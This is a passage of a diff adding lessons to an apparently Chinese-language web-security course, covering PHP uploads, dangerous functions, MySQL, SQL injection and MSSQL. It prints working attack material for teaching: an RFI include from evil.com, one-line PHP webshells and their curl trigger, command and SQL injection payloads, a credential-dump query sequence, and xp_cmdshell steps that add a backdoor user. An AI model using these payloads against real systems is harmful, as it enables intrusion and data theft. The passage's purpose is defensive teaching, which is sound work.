+  <strong>LFI（本地文件包含）：</strong><code>?page=../../../etc/passwd</code> 讀取服務器本地文件。<br>
+  <strong>RFI（遠程文件包含）：</strong><code>?page=http://evil.com/shell.php</code> 包含遠程 Webshell（需 PHP 配置允許）。<br>
+  防禦：使用白名單限制可包含的文件，禁用 <code>allow_url_include</code>。</p>
+</div>
+</div>
+
+<!-- L3-4 文件上傳 Session -->
+<div class="cb" id="l3-4">
+<h2>文件上傳、會話管理與錯誤處理</h2>
+
+<h3>文件上傳安全</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP — 文件上傳處理</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── 不安全的文件上傳（漏洞示例）───</span>
+<span class="sl">$name</span> = <span class="sl">$_FILES</span>[<span class="st">'file'</span>][<span class="st">'name'</span>];
+<span class="fn">move_uploaded_file</span>(<span class="sl">$_FILES</span>[<span class="st">'file'</span>][<span class="st">'tmp_name'</span>], <span class="st">"uploads/"</span> . <span class="sl">$name</span>);
+<span class="cm">// 攻擊者上傳 shell.php → 訪問 /uploads/shell.php → GetShell！</span>
+
+<span class="cm">// ─── 安全的文件上傳（正確示例）───</span>
+<span class="sl">$allowed</span> = [<span class="st">'jpg'</span>, <span class="st">'jpeg'</span>, <span class="st">'png'</span>, <span class="st">'gif'</span>];
+<span class="sl">$ext</span>     = <span class="fn">strtolower</span>(<span class="fn">pathinfo</span>(<span class="sl">$name</span>, PATHINFO_EXTENSION));
+
+<span class="kw">if</span> (!<span class="fn">in_array</span>(<span class="sl">$ext</span>, <span class="sl">$allowed</span>)) {
+    <span class="kw">die</span>(<span class="st">"只允許上傳圖片"</span>);
+}
+<span class="cm">// 還需要：檢查 MIME 類型、文件頭魔數、重命名文件、存放在 Web 根目錄外</span>
+
+<span class="cm">// ─── Session 管理 ───</span>
+<span class="fn">session_start</span>();           <span class="cm">// 啟動 Session（必須在輸出前調用）</span>
+<span class="sl">$_SESSION</span>[<span class="st">'user'</span>] = <span class="st">'Alice'</span>; <span class="cm">// 設定 Session 值</span>
+<span class="sl">$_SESSION</span>[<span class="st">'role'</span>] = <span class="st">'admin'</span>;
+
+<span class="cm">// 登入驗證</span>
+<span class="kw">if</span> (!<span class="kw">isset</span>(<span class="sl">$_SESSION</span>[<span class="st">'user'</span>])) {
+    <span class="fn">header</span>(<span class="st">'Location: /login.php'</span>);
+    <span class="kw">exit</span>;
+}
+
+<span class="cm">// 登出（安全的 Session 清除）</span>
+<span class="fn">session_unset</span>();
+<span class="fn">session_destroy</span>();
+
+<span class="cm">// ─── 錯誤處理（不要洩露錯誤詳情給用戶！）───</span>
+ini_set(<span class="st">'display_errors'</span>, <span class="nu">0</span>);    <span class="cm">// 生產環境關閉錯誤顯示</span>
+ini_set(<span class="st">'log_errors'</span>, <span class="nu">1</span>);        <span class="cm">// 記錄到日誌文件</span>
+<span class="op">?&gt;</span></pre>
+</div>
+
+<div class="note warn">
+  <div class="note-lbl">錯誤信息洩露風險</div>
+  <p>開啟 <code>display_errors = On</code> 的 PHP 錯誤頁面會洩露：文件絕對路徑（如 <code>/var/www/html/...</code>）、資料庫結構、PHP 版本等敏感信息，這些都是滲透測試中情報收集的重要來源。生產環境必須關閉錯誤顯示，改為記錄到日誌文件。</p>
+</div>
+</div>
+
+<!-- L3-5 PHP 操作 MySQL -->
+<div class="cb" id="l3-5">
+<h2>PHP 操作 MySQL 資料庫</h2>
+<p>PHP 操作資料庫有三種方式：mysql_* 函數（已廢棄，危險）、mysqli 擴展、PDO（推薦）。理解這三種方式有助於在代碼審計時識別 SQL 注入漏洞。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP — PDO 安全連線與查詢</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── PDO 連線（推薦的安全方式）───</span>
+<span class="kw">try</span> {
+    <span class="sl">$pdo</span> = <span class="kw">new</span> <span class="fn">PDO</span>(
+        <span class="st">'mysql:host=localhost;dbname=mydb;charset=utf8'</span>,
+        <span class="st">'dbuser'</span>,
+        <span class="st">'dbpass'</span>
+    );
+    <span class="sl">$pdo</span>->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+} <span class="kw">catch</span> (PDOException <span class="sl">$e</span>) {
+    <span class="cm">// 記錄錯誤，但不顯示給用戶</span>
+    error_log(<span class="sl">$e</span>-><span class="fn">getMessage</span>());
+    <span class="kw">die</span>(<span class="st">"資料庫連線失敗"</span>);
+}
+
+<span class="cm">// ─── 預處理語句（防 SQL 注入的正確做法）───</span>
+<span class="sl">$stmt</span> = <span class="sl">$pdo</span>-><span class="fn">prepare</span>(<span class="st">"SELECT * FROM users WHERE id = :id"</span>);
+<span class="sl">$stmt</span>-><span class="fn">bindParam</span>(<span class="st">':id'</span>, <span class="sl">$_GET</span>[<span class="st">'id'</span>], PDO::PARAM_INT);
+<span class="sl">$stmt</span>-><span class="fn">execute</span>();
+<span class="sl">$user</span> = <span class="sl">$stmt</span>-><span class="fn">fetch</span>(PDO::FETCH_ASSOC);
+
+<span class="cm">// ─── 不安全的字串拼接（漏洞示例！）───</span>
+<span class="sl">$id</span>    = <span class="sl">$_GET</span>[<span class="st">'id'</span>];   <span class="cm">// 用戶輸入：1 OR 1=1</span>
+<span class="sl">$query</span> = <span class="st">"SELECT * FROM users WHERE id = $id"</span>;
+<span class="cm">// 最終 SQL：SELECT * FROM users WHERE id = 1 OR 1=1 → 洩露所有用戶！</span>
+
+<span class="cm">// ─── INSERT 插入（同樣使用預處理）───</span>
+<span class="sl">$stmt</span> = <span class="sl">$pdo</span>-><span class="fn">prepare</span>(<span class="st">"INSERT INTO logs (user, action) VALUES (?, ?)"</span>);
+<span class="sl">$stmt</span>-><span class="fn">execute</span>([<span class="sl">$_SESSION</span>[<span class="st">'user'</span>], <span class="st">'login'</span>]);
+<span class="op">?&gt;</span></pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">預處理語句為什麼能防止 SQL 注入</div>
+  <p>預處理語句（Prepared Statement）將 SQL 結構和數據分開傳輸。SQL 模板先發送給資料庫編譯，再單獨傳入參數值。資料庫已經知道哪裡是「代碼」、哪裡是「數據」，因此無論參數包含什麼特殊字符，都只會被當作普通數據處理，不可能改變 SQL 的邏輯結構。這是防 SQL 注入最根本的方法。</p>
+</div>
+</div>
+
+<!-- L3-6 危險函數 -->
+<div class="cb" id="l3-6">
+<h2>PHP 危險函數與安全開發規範</h2>
+<p>在代碼審計中，識別危險函數是發現漏洞的關鍵捷徑。以下是最常被利用的 PHP 危險函數速查表。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>函數</th><th>漏洞類型</th><th>危險用法範例</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">eval()</td><td>代碼注入 / Webshell</td><td><code>eval($_POST['cmd'])</code> — 直接執行用戶提交的 PHP 代碼，一句話 Webshell 的核心</td></tr>
+      <tr><td class="mc">system() / exec() / passthru() / shell_exec()</td><td>命令注入 (RCE)</td><td><code>system("ping ".$_GET['ip'])</code> — 攻擊者可注入 <code>;cat /etc/passwd</code></td></tr>
+      <tr><td class="mc">include() / require() / include_once()</td><td>文件包含 (LFI/RFI)</td><td><code>include($_GET['page'])</code> — 路徑遍歷或包含 Webshell</td></tr>
+      <tr><td class="mc">unserialize()</td><td>反序列化漏洞</td><td>接收來自用戶的序列化數據，可能觸發惡意類的 __wakeup() 方法</td></tr>
+      <tr><td class="mc">preg_replace() 帶 /e 修飾符</td><td>代碼注入</td><td>PHP 5 中 <code>/e</code> 修飾符會將替換結果當 PHP 代碼執行（PHP 7 已移除）</td></tr>
+      <tr><td class="mc">file_get_contents() / readfile()</td><td>任意文件讀取</td><td><code>readfile($_GET['file'])</code> — 可讀取 <code>/etc/passwd</code> 等敏感文件</td></tr>
+      <tr><td class="mc">move_uploaded_file()</td><td>文件上傳漏洞</td><td>未驗證文件類型直接保存，可上傳 PHP Webshell</td></tr>
+      <tr><td class="mc">header('Location: '.$url)</td><td>開放重定向</td><td>可將用戶重定向到釣魚網站</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3>一句話 Webshell 解析</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP Webshell 原理分析</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// 最簡單的一句話 Webshell（長度僅 28 字元）</span>
+<span class="op">&lt;?</span><span class="tg">php</span> <span class="fn">eval</span>(<span class="sl">$_POST</span>[<span class="st">'cmd'</span>]); <span class="op">?&gt;</span>
+
+<span class="cm">// 攻擊流程：
+// 1. 通過文件上傳漏洞上傳此文件到伺服器
+// 2. 使用 Burp Suite / curl 發送 POST 請求
+//    curl http://target.com/uploads/shell.php -d 'cmd=system("id");'
+// 3. 服務端 eval() 執行 system("id")，返回當前用戶</span>
+
+<span class="cm">// 常見的變形（繞過簡單黑名單）</span>
+<span class="op">&lt;?</span><span class="tg">php</span> <span class="fn">assert</span>(<span class="sl">$_POST</span>[<span class="st">'c'</span>]); <span class="op">?&gt;</span>
+<span class="op">&lt;?</span><span class="tg">php</span> <span class="fn">system</span>(<span class="sl">$_GET</span>[<span class="st">'c'</span>]); <span class="op">?&gt;</span>
+<span class="op">&lt;?</span><span class="tg">php</span> <span class="fn">call_user_func</span>(<span class="sl">$_POST</span>[<span class="st">'f'</span>], <span class="sl">$_POST</span>[<span class="st">'c'</span>]); <span class="op">?&gt;</span></pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">以下哪個 PHP 代碼片段存在命令注入漏洞（RCE）？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span><code>$name = htmlspecialchars($_GET['name']);</code></div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span><code>$id = (int)$_GET['id'];</code></div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span><code>system("ping -c 1 " . $_GET['host']);</code></div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");</code></div>
+  </div>
+  <div class="q-exp">正確！選項 C 將用戶輸入的 host 參數直接拼接到系統命令中，攻擊者只需傳入 <code>127.0.0.1; cat /etc/passwd</code> 即可在執行 ping 命令後再執行任意命令（分號是 Shell 命令分隔符）。選項 A 使用了 HTML 編碼防 XSS，B 強制轉換整數防 SQL 注入，D 使用預處理語句防 SQL 注入，都是安全做法。</div>
+</div>
+</div>
+
+
+<!-- ===== CH4: MySQL ===== -->
+
+<!-- L4-1 資料庫介紹 -->
+<div class="cb" id="l4-1">
+<h2>資料庫介紹與安裝</h2>
+<p>資料庫是 Web 應用存儲數據的核心，也是 SQL 注入攻擊的最終目標。理解資料庫的工作原理，是學習 SQL 注入的基礎。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">MySQL</div><div class="kt-d">最流行的開源關聯式資料庫，被 WordPress、Drupal、Laravel 廣泛使用。SQL 注入漏洞中 80% 以上涉及 MySQL。默認端口 3306。</div></div>
+  <div class="kt"><div class="kt-n">MSSQL（SQL Server）</div><div class="kt-d">微軟出品，主要用於 .NET / ASP 技術棧的企業系統。有 xp_cmdshell 等特殊功能，利用價值高，默認端口 1433。</div></div>
+  <div class="kt"><div class="kt-n">Oracle</div><div class="kt-d">企業級資料庫，常見於銀行、政府等大型機構。SQL 注入語法與 MySQL 有差異，如使用 ROWNUM 代替 LIMIT。</div></div>
+  <div class="kt"><div class="kt-n">PostgreSQL</div><div class="kt-d">功能強大的開源資料庫，可執行系統命令（COPY TO/FROM PROGRAM），近年在雲端環境中增長迅速。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MySQL — 安裝與初始化</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># CentOS 安裝 MySQL</span>
+yum install -y mariadb-server mariadb
+systemctl enable --now mariadb
+
+<span class="cm"># 安全初始化（設定 root 密碼，刪除測試資料庫）</span>
+mysql_secure_installation
+
+<span class="cm"># 登入 MySQL</span>
+mysql -u root -p
+
+<span class="cm"># Docker 快速啟動 MySQL（測試環境推薦）</span>
+docker run -d --name mysql \
+  -e MYSQL_ROOT_PASSWORD=rootpass \
+  -e MYSQL_DATABASE=mydb \
+  -p 3306:3306 mysql:8.0</pre>
+</div>
+</div>
+
+<!-- L4-2 資料庫與資料表 -->
+<div class="cb" id="l4-2">
+<h2>資料庫與資料表操作</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MySQL — DDL 操作（資料定義語言）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 資料庫操作</span>
+<span class="kw">SHOW</span> DATABASES;                       <span class="cm">-- 列出所有資料庫</span>
+<span class="kw">CREATE</span> DATABASE mydb CHARACTER SET utf8mb4;
+<span class="kw">USE</span> mydb;
+<span class="kw">DROP</span> DATABASE mydb;
+
+<span class="cm">-- 資料表操作</span>
+<span class="kw">SHOW</span> TABLES;
+<span class="kw">DESC</span> users;                           <span class="cm">-- 查看表結構</span>
+
+<span class="kw">CREATE</span> TABLE users (
+    id       INT AUTO_INCREMENT <span class="kw">PRIMARY</span> KEY,
+    username VARCHAR(<span class="nu">50</span>)  <span class="kw">NOT</span> NULL UNIQUE,
+    password VARCHAR(<span class="nu">255</span>) <span class="kw">NOT</span> NULL,
+    email    VARCHAR(<span class="nu">100</span>),
+    role     ENUM(<span class="st">'user'</span>, <span class="st">'admin'</span>) DEFAULT <span class="st">'user'</span>,
+    created  DATETIME DEFAULT CURRENT_TIMESTAMP
+);
+
+<span class="cm">-- 修改表結構</span>
+<span class="kw">ALTER</span> TABLE users ADD COLUMN phone VARCHAR(<span class="nu">20</span>);
+<span class="kw">ALTER</span> TABLE users DROP COLUMN phone;
+<span class="kw">ALTER</span> TABLE users MODIFY COLUMN email VARCHAR(<span class="nu">200</span>);
+
+<span class="cm">-- 資安視角：查看 information_schema（SQL 注入的重要目標）</span>
+<span class="kw">SELECT</span> table_name <span class="kw">FROM</span> information_schema.tables
+<span class="kw">WHERE</span> table_schema = <span class="st">'mydb'</span>;
+
+<span class="kw">SELECT</span> column_name, data_type <span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> table_name = <span class="st">'users'</span>;</pre>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">information_schema：SQL 注入的寶藏</div>
+  <p><code>information_schema</code> 是 MySQL 的元資料庫，存儲了所有資料庫、資料表、欄位的結構信息。在 SQL 注入攻擊中，攻擊者通常先查詢 <code>information_schema.tables</code> 獲取所有表名，再查詢 <code>information_schema.columns</code> 獲取欄位名，然後才能精確地提取目標數據（如用戶名、密碼、信用卡號等）。這個過程將在 Stage 4 的 SQL 注入章節詳細學習。</p>
+</div>
+</div>
+
+<!-- L4-3 CRUD -->
+<div class="cb" id="l4-3">
+<h2>CRUD 操作與 SELECT 查詢</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MySQL — DML 操作（資料操作語言）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- ─── INSERT 新增 ───</span>
+<span class="kw">INSERT</span> <span class="kw">INTO</span> users (username, password, email)
+<span class="kw">VALUES</span> (<span class="st">'alice'</span>, MD5(<span class="st">'password123'</span>), <span class="st">'alice@example.com'</span>);
+
+<span class="cm">-- ─── SELECT 查詢 ───</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users;
+<span class="kw">SELECT</span> username, email <span class="kw">FROM</span> users <span class="kw">WHERE</span> id = <span class="nu">1</span>;
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">ORDER</span> <span class="kw">BY</span> id <span class="kw">DESC</span> <span class="kw">LIMIT</span> <span class="nu">10</span>;
+
+<span class="cm">-- 模糊查詢（LIKE）</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="kw">LIKE</span> <span class="st">'ali%'</span>;
+
+<span class="cm">-- 聚合函數</span>
+<span class="kw">SELECT</span> COUNT(*) <span class="kw">FROM</span> users;
+<span class="kw">SELECT</span> role, COUNT(*) <span class="kw">FROM</span> users <span class="kw">GROUP</span> <span class="kw">BY</span> role;
+
+<span class="cm">-- ─── UPDATE 修改 ───</span>
+<span class="kw">UPDATE</span> users <span class="kw">SET</span> role = <span class="st">'admin'</span> <span class="kw">WHERE</span> id = <span class="nu">1</span>;
+<span class="cm">-- 危：無 WHERE 條件 → 更新所有記錄！</span>
+
+<span class="cm">-- ─── DELETE 刪除 ───</span>
+<span class="kw">DELETE</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> id = <span class="nu">99</span>;
+<span class="cm">-- 危：DELETE FROM users; → 刪除所有用戶！</span>
+
+<span class="cm">-- ─── UNION（SQL 注入核心技術）───</span>
+<span class="cm">-- 查詢結果合併，兩個 SELECT 的欄位數必須相同</span>
+<span class="kw">SELECT</span> username, password <span class="kw">FROM</span> users
+<span class="kw">UNION</span>
+<span class="kw">SELECT</span> table_name, <span class="st">'x'</span> <span class="kw">FROM</span> information_schema.tables;</pre>
+</div>
+</div>
+
+<!-- L4-4 字元集索引權限 -->
+<div class="cb" id="l4-4">
+<h2>字元集、索引與帳號權限</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MySQL — 字元集、索引與帳號管理</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- ─── 字元集（與 SQL 注入繞過有關）───</span>
+<span class="kw">SHOW</span> VARIABLES <span class="kw">LIKE</span> <span class="st">'char%'</span>;
+<span class="kw">ALTER</span> TABLE users CONVERT <span class="kw">TO</span> CHARACTER SET utf8mb4;
+
+<span class="cm">-- ─── 索引（提升查詢效能）───</span>
+<span class="kw">CREATE</span> INDEX idx_email <span class="kw">ON</span> users(email);
+<span class="kw">SHOW</span> INDEX <span class="kw">FROM</span> users;
+
+<span class="cm">-- ─── 帳號與權限管理（最小化權限原則）───</span>
+<span class="kw">CREATE</span> USER <span class="st">'webuser'</span>@<span class="st">'localhost'</span> IDENTIFIED BY <span class="st">'StrongPass!123'</span>;
+
+<span class="cm">-- 只授予必要權限（不要用 root 帳號給 Web 應用連接！）</span>
+<span class="kw">GRANT</span> SELECT, INSERT, UPDATE <span class="kw">ON</span> mydb.* <span class="kw">TO</span> <span class="st">'webuser'</span>@<span class="st">'localhost'</span>;
+<span class="kw">FLUSH</span> PRIVILEGES;
+
+<span class="cm">-- 查看帳號權限</span>
+<span class="kw">SHOW</span> GRANTS <span class="kw">FOR</span> <span class="st">'webuser'</span>@<span class="st">'localhost'</span>;
+
+<span class="cm">-- 撤銷權限</span>
+<span class="kw">REVOKE</span> INSERT <span class="kw">ON</span> mydb.* <span class="kw">FROM</span> <span class="st">'webuser'</span>@<span class="st">'localhost'</span>;
+<span class="kw">DROP</span> USER <span class="st">'webuser'</span>@<span class="st">'localhost'</span>;</pre>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">最小化權限原則</div>
+  <p>Web 應用使用的資料庫帳號應遵循最小化權限原則：<strong>只給予業務所需的最低權限</strong>。例如一個只需查詢和插入的應用，不應有 DELETE、DROP 或 FILE 權限。這樣即使發生 SQL 注入，攻擊者能做的事情也大大受限。如果攻擊者通過 SQL 注入執行 <code>DROP TABLE users</code>，Web 帳號沒有 DROP 權限就能阻止這個操作。</p>
+</div>
+</div>
+
+<!-- L4-5 SQL 注入前置 -->
+<div class="cb" id="l4-5">
+<h2>資安視角：SQL 注入前置知識</h2>
+<p>本節將之前學習的 MySQL 知識與 SQL 注入漏洞直接連結，為 Stage 4 的深入學習做準備。</p>
+
+<h3>SQL 注入的原理</h3>
+<p>SQL 注入發生在 Web 應用將用戶輸入<strong>未經過濾地拼接</strong>進 SQL 語句時。攻擊者通過構造特殊的輸入，改變 SQL 語句的邏輯，實現越權查詢、繞過認證、提取數據甚至執行系統命令。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">SQL 注入原理示例</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 正常查詢（用戶輸入 id=1）</span>
+SELECT * FROM users WHERE id = 1;
+
+<span class="cm">-- 注入攻擊（用戶輸入 id=1 OR 1=1）</span>
+SELECT * FROM users WHERE id = 1 OR 1=1;
+<span class="cm">-- 結果：返回所有用戶記錄！（因為 1=1 恆為真）</span>
+
+<span class="cm">-- 繞過登入驗證（用戶名輸入 admin'--）</span>
+SELECT * FROM users WHERE username='admin'--' AND password='xxx';
+<span class="cm">-- -- 是 MySQL 注釋符，後面的 AND password=... 被注釋掉
+-- 結果：不驗證密碼直接登入 admin！</span>
+
+<span class="cm">-- UNION 注入（提取其他表的數據）</span>
+<span class="cm">-- 用戶輸入 id=1 UNION SELECT username,password FROM users--</span>
+SELECT name, desc FROM products WHERE id=1 
+UNION SELECT username, password FROM users--;
+<span class="cm">-- 結果：商品查詢結果中混入了用戶表的帳號密碼！</span>
+
+<span class="cm">-- 通過 information_schema 獲取所有表名</span>
+SELECT table_name FROM information_schema.tables
+WHERE table_schema=database() LIMIT 1,1;</pre>
+</div>
+
+<h3>SQL 注入類型一覽</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>類型</th><th>特點</th><th>說明</th></tr></thead>
+    <tbody>
+      <tr><td><strong>聯合查詢注入</strong></td><td>有回顯</td><td>使用 UNION SELECT 在頁面顯示位提取數據，最常見、最直接</td></tr>
+      <tr><td><strong>錯誤注入</strong></td><td>有錯誤回顯</td><td>利用資料庫報錯信息中包含的數據，如 extractvalue()、updatexml()</td></tr>
+      <tr><td><strong>布林盲注</strong></td><td>無回顯，有差異</td><td>根據頁面返回「真」或「假」的差異，逐字元猜測數據（if、substr）</td></tr>
+      <tr><td><strong>時間盲注</strong></td><td>無任何回顯</td><td>利用 SLEEP() 函數，根據響應時間判斷條件真假（最慢，通常最後選擇）</td></tr>
+      <tr><td><strong>堆疊注入</strong></td><td>可執行多條語句</td><td>使用分號 ; 執行多條 SQL，可執行 INSERT、UPDATE 甚至 DROP TABLE</td></tr>
+      <tr><td><strong>帶外注入（OOB）</strong></td><td>無任何回顯</td><td>利用 DNS 或 HTTP 請求將數據帶出，適用於嚴格過濾的場景</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">一個登入頁面在用戶名欄位輸入 <code>admin' OR '1'='1</code>，密碼隨便填，結果成功登入了。這說明這個應用存在什麼漏洞？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>XSS 漏洞，因為輸入了特殊字符</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>暴力破解成功，說明密碼太簡單</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>SQL 注入漏洞，用戶名中的 SQL 語句改變了查詢邏輯，繞過了密碼驗證</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>Session 固定攻擊，Session 被竊取</div>
+  </div>
+  <div class="q-exp">正確！這是 SQL 注入繞過認證的經典場景。原本的 SQL 查詢可能是 <code>SELECT * FROM users WHERE username='$u' AND password='$p'</code>，注入 <code>admin' OR '1'='1</code> 後變成 <code>WHERE username='admin' OR '1'='1' AND password='...'</code>。由於 OR 優先級的關係，條件變成 <code>admin' OR TRUE</code>，查詢返回 admin 用戶，跳過了密碼驗證。</div>
+</div>
+</div>
+
+<!-- L4-6 MSSQL -->
+<div class="cb" id="l4-6">
+<h2>MSSQL 基礎與差異比較</h2>
+<p>Microsoft SQL Server（MSSQL）在企業系統中廣泛使用，尤其是 ASP.NET 技術棧。從滲透角度，MSSQL 的最大特點是存在 <strong>xp_cmdshell</strong> 儲存過程，可以直接執行系統命令。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MSSQL — 基礎語法與資安特性</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- MSSQL 查詢當前資料庫和用戶</span>
+SELECT DB_NAME();        -- 當前資料庫
+SELECT USER_NAME();      -- 當前用戶
+SELECT @@VERSION;        -- SQL Server 版本
+
+<span class="cm">-- MSSQL 的系統表（相當於 MySQL 的 information_schema）</span>
+SELECT name FROM sys.databases;
+SELECT name FROM sys.tables;
+SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');
+
+<span class="cm">-- MSSQL 特有的注入技巧</span>
+<span class="cm">-- 注釋符：-- 或 /* */ （與 MySQL 相同）</span>
+<span class="cm">-- 字串連接：+ 號（MySQL 用 CONCAT()）</span>
+SELECT 'a' + 'b'  -- 結果：'ab'
+
+<span class="cm">-- MSSQL 時間盲注（WAITFOR 替代 SLEEP）</span>
+IF (1=1) WAITFOR DELAY '0:0:5'  -- 延遲 5 秒
+
+<span class="cm">-- xp_cmdshell：MSSQL 的命令執行神器（高危！）</span>
+<span class="cm">-- 默認禁用，但 sa 帳號可以開啟</span>
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+-- 開啟後可執行系統命令：
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user hacker Pass123 /add';</pre>
+</div>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>特性</th><th>MySQL</th><th>MSSQL</th></tr></thead>
+    <tbody>
+      <tr><td>分頁查詢</td><td class="mc">LIMIT 10 OFFSET 20</td><td class="mc">OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY</td></tr>
+      <tr><td>字串連接</td><td class="mc">CONCAT(a, b) 或 CONCAT_WS</td><td class="mc">a + b</td></tr>
+      <tr><td>注釋符</td><td class="mc">-- 或 # 或 /**/</td><td class="mc">-- 或 /**/（無 # 號）</td></tr>
+      <tr><td>延時函數</td><td class="mc">SLEEP(5)</td><td class="mc">WAITFOR DELAY '0:0:5'</td></tr>
+      <tr><td>命令執行</td><td class="mc">需配合 UDF 提權</td><td class="mc">xp_cmdshell（MSSQL 獨有）</td></tr>
+      <tr><td>元資料庫</td><td class="mc">information_schema</td><td class="mc">sys.tables、sys.columns</td></tr>
+      <tr><td>默認端口</td><td class="mc">3306</td><td class="mc">1433</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+<!-- L4-7 MySQL 函數速查 -->
+<div class="cb" id="l4-7">
+<h2>MySQL 常用函數速查</h2>
+<p>這些函數在 SQL 注入測試和資料庫操作中頻繁使用，熟記能大幅提升工作效率。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>類別</th><th>函數</th><th>說明</th><th>SQL 注入用途</th></tr></thead>
+    <tbody>
+      <tr><td rowspan="5"><strong>信息函數</strong></td><td class="mc">database()</td><td>返回當前資料庫名</td><td>注入時第一個查的函數</td></tr>
+      <tr><td class="mc">user()</td><td>返回當前 MySQL 用戶</td><td>判斷是否為 root 帳號</td></tr>
+      <tr><td class="mc">version()</td><td>返回 MySQL 版本</td><td>判斷版本特性和可用函數</td></tr>
+      <tr><td class="mc">@@datadir</td><td>資料庫文件目錄</td><td>判斷是否可寫 Webshell</td></tr>
+      <tr><td class="mc">@@global.secure_file_priv</td><td>文件讀寫權限目錄</td><td>判斷能否使用 INTO OUTFILE</td></tr>
+      <tr><td rowspan="4"><strong>字串函數</strong></td><td class="mc">substr(str,pos,len)</td><td>截取子字串</td><td>布林盲注逐字元提取數據</td></tr>
+      <tr><td class="mc">length(str)</td><td>字串長度</td><td>盲注時先判斷長度</td></tr>
+      <tr><td class="mc">ascii(char)</td><td>返回字符的 ASCII 值</td><td>盲注時比較字符的數值</td></tr>
+      <tr><td class="mc">group_concat(col)</td><td>將多行結果合併為一個字串</td><td>一次查出所有表名/列名</td></tr>
+      <tr><td rowspan="3"><strong>條件函數</strong></td><td class="mc">if(cond,t,f)</td><td>三元條件表達式</td><td>布林盲注構造判斷條件</td></tr>
+      <tr><td class="mc">sleep(n)</td><td>延時 n 秒</td><td>時間盲注的核心函數</td></tr>
+      <tr><td class="mc">benchmark(n,expr)</td><td>重複執行表達式 n 次（製造延時）</td><td>時間盲注的替代方案</td></tr>
+      <tr><td rowspan="2"><strong>報錯函數</strong></td><td class="mc">extractvalue(xml,xpath)</td><td>提取 XML 值（報錯可洩露數據）</td><td>錯誤注入的常用函數</td></tr>
+      <tr><td class="mc">updatexml(xml,xpath,new)</td><td>更新 XML 值（報錯洩露數據）</td><td>錯誤注入的常用函數</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">MySQL 注入常用查詢組合</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">-- 第1步：獲取當前資料庫名</span>
+<span class="kw">SELECT</span> database();
+
+<span class="cm">-- 第2步：獲取所有資料表名（group_concat 一次列出）</span>
+<span class="kw">SELECT</span> group_concat(table_name) <span class="kw">FROM</span> information_schema.tables
+<span class="kw">WHERE</span> table_schema=database();
+
+<span class="cm">-- 第3步：獲取指定表的所有欄位名</span>
+<span class="kw">SELECT</span> group_concat(column_name) <span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> table_name=<span class="st">'users'</span>;
+
+<span class="cm">-- 第4步：提取數據</span>
+<span class="kw">SELECT</span> group_concat(username, <span class="st">'~'</span>, password) <span class="kw">FROM</span> users;
+
+<span class="cm">-- 布林盲注示例（逐字元猜測 database() 的第1個字）</span>
